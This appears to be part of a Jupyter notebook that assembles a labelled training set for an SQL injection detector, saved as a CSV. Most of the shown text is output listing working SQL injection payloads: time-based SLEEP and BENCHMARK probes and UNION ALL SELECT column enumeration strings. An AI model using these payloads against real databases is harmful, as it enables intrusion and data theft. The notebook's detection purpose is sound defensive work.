       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\",\n",
       " ' ORDER BY SLEEP ( 5 ) #',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) #',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) ,3#',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) ,3,4#',\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\",\n",
       " ' ORDER BY SLEEP ( 5 ) -- ',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) -- ',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) ,3-- ',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) ,3,4-- ',\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12-- \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13-- \",\n",
       " ...]"
      ]
     },
     "execution_count": 168,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {},
   "outputs": [],
   "source": [
    "#adding labels to sqli dataset (1)\n",
    "dataset=[]\n",
    "for i in all_sqli_sentences:\n",
    "    dataset.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "14457"
      ]
     },
     "execution_count": 170,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(dataset)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Combination of SuperPowers_legit and SCott_park benign data (normal data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {},
   "outputs": [],
   "source": [
    "#adding labels to benign dataset (0)\n",
    "for i in data:\n",
    "    dataset.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 172,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in SuperPowers_legit:\n",
    "    dataset.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('\"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( \"vRlU\" = \"vRlU',\n",
       "  1),\n",
       " ('\"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( \"Wsle\" = \"Wsle',\n",
       "  1),\n",
       " ('\"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( \"FySY\" = \"FySY',\n",
       "  1),\n",
       " ('\"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( \"WgQt\" = \"WgQt',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"qNyI\" = \"qNyI',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"iDBL\" = \"iDBL',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"oPpm\" = \"oPpm',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"EXkT\" = \"EXkT',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"xkGT\" = \"xkGT',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"ZSwK\" = \"ZSwK',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"HIdp\" = \"HIdp',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"fasg\" = \"fasg',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"VSAm\" = \"VSAm',\n",
       "  1),\n",
       " ('\" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND \"Guws\" = \"Guws',\n",
       "  1),\n",
       " ('\" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( \"MbiD\" LIKE \"MbiD',\n",
       "  1),\n",
       " ('\" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( \"yWBx\" LIKE \"yWBx',\n",
       "  1),\n",
       " ('\" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( \"kxly\" LIKE \"kxly',\n",
       "  1),\n",
       " ('\" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( \"YGBA\" LIKE \"YGBA',\n",
       "  1),\n",
       " ('\" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( \"HKAT\" LIKE \"HKAT',\n",
       "  1),\n",
       " ('\" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( \"bNgY\" LIKE \"bNgY',\n",
       "  1)]"
      ]
     },
     "execution_count": 173,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataset[4400:4420]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "18900\n"
     ]
    }
   ],
   "source": [
    "print(len(dataset))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {},
   "outputs": [],
   "source": [
    "df= pd.DataFrame(dataset, columns=['sentence','type'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv(r'./dataset/myOwnDataset/myDataset.csv', index=False, encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sentence</th>\n",
       "      <th>type</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>a</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>a'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>a' --</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>a' or 1 = 1; --</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>@</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          sentence  type\n",
       "0                a     1\n",
       "1              a'      1\n",
       "2            a' --     1\n",
       "3  a' or 1 = 1; --     1\n",
       "4                @     1"
      ]
     },
     "execution_count": 177,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 178,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1    14457\n",
      "0     4443\n",
      "Name: type, dtype: int64\n"
     ]
    }
   ],
   "source": [
    "print(df['type'].value_counts()) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
